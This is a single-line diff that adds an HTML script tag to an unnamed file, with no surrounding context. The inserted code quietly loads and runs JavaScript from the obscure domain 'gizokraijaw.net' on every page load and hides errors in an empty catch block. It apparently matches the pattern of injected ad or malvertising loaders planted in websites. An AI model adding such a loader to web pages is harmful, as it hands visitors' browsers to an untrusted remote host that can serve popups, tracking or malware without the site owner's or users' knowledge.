@@ -1,0 +1,1 @@
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9369964,document.createElement('script'))</script>
